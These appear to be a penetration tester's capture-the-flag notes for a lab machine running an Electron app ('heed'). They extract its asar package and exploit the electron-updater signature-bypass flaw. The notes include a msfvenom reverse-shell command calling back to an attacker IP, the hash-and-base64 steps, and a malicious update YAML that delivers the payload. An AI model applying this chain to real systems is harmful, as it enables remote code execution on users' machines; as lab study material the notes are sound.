### Decompile heed setup


![[Pasted image 20211219042215.png]]

![[Pasted image 20211219042256.png]]

![[Pasted image 20211219145834.png]]

![[Pasted image 20211219150021.png]]


* To extract asar file need install asar extractor, using npm
```bash
$ sudo npm -g install asar
```

* Listing all files in app.asar
```bash
$ asar l app.asar                                                                     
/createNote.html                                                                               
/main.js                                                                                       
/package.json                                                                                  
/version.html                                                                                  
/icons                                                                                         
/icons/ico.png                                                                                 
/node_modules 
... [snip] ...
```

* Extracting files  of app.asar
```bash
$ asar e app.asar $(pwd)
┌─[us-vip-13]─[10.10.14.21]─[dix@motoko]─[~/htb/atom/web/heed/app/resources/app]
└──╼ [??]$ ls
app.asar  createNote.html  icons  main.js  node_modules  package.json  version.html

```

* Main.js use library "election-updater"
```js
$ cat main.js                                                                                                                                                                        
const {app, BrowserWindow, Menu, protocol, ipcMain} = require('electron');                                                                                                                    
const log = require('electron-log');                                                                                                                                                          
const {autoUpdater} = require("electron-updater");                                                                                                                                            
const path = require('path'); 
```

* Search on google for "electron builder exploit" leads to this exploit
 https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html
 ![[Pasted image 20211219153425.png]]
 
 yml malicous update
 ![[Pasted image 20211219153809.png]]
 
 ``` bash
version: 1.2.3
files:
  - url: v’ulnerable-app-setup-1.2.3.exe
  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
  size: 44653912
path: v'ulnerable-app-1.2.3.exe
sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
releaseDate: '2019-11-20T11:17:02.627Z'
```

* Create a reverse shell with msfvenom 
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=9001 -f exe -o rev.exe
```

Take the sha512 and base64 of the rev.exe
```
$ sha512sum rev.exe 
efdc6542fef36585a7e5ab5af462bb50e3b07adb2af607abe0bbf024e42cabf474f47833527019a20295a0483b116a2e6025cd735b6fb549e244d156402d311e  rev.exe
┌─[us-vip-13]─[10.10.14.21]─[dix@motoko]─[~/htb/atom/exploit]
└──╼ [??]$ sha512sum rev.exe | awk '{print $1}'
efdc6542fef36585a7e5ab5af462bb50e3b07adb2af607abe0bbf024e42cabf474f47833527019a20295a0483b116a2e6025cd735b6fb549e244d156402d311e
┌─[us-vip-13]─[10.10.14.21]─[dix@motoko]─[~/htb/atom/exploit]
└──╼ [??]$ sha512sum rev.exe | awk '{print $1}' | xxd -r -p
eBeZbPz*$,tx3RpH;j.`%s[oIDV@-1┌─[us-vip-13]─[10.10.14.21]─[dix@motoko]─[~/htb/atom/exploit]
└──╼ [??]$ sha512sum rev.exe | awk '{print $1}' | xxd -r -p | base64 -w 0
79xlQv7zZYWn5ata9GK7UOOwetsq9ger4LvwJOQsq/R09HgzUnAZogKVoEg7EWouYCXNc1tvtUniRNFWQC0xHg==┌─[us-vip-13]─[10.10.14.21]─[dix@motoko]─[~/htb/atom/exploit]
└──╼ [??]$
```

* When see base64 of a hashes, normally is a base64 of the data hash
![[Pasted image 20211219162958.png]]


* yml with the rev.exe
```
version: 1.33.7
files:
  - url: r'ev.exe
    sha512: 79xlQv7zZYWn5ata9GK7UOOwetsq9ger4LvwJOQsq/R09HgzUnAZogKVoEg7EWouYCXNc1tvtUniRNFWQC0xHg==
    size: 7168
path: r'ev.exe
sha512: 79xlQv7zZYWn5ata9GK7UOOwetsq9ger4LvwJOQsq/R09HgzUnAZogKVoEg7EWouYCXNc1tvtUniRNFWQC0xHg==
releaseDate: '2021-12-19T11:17:02.627Z'

```

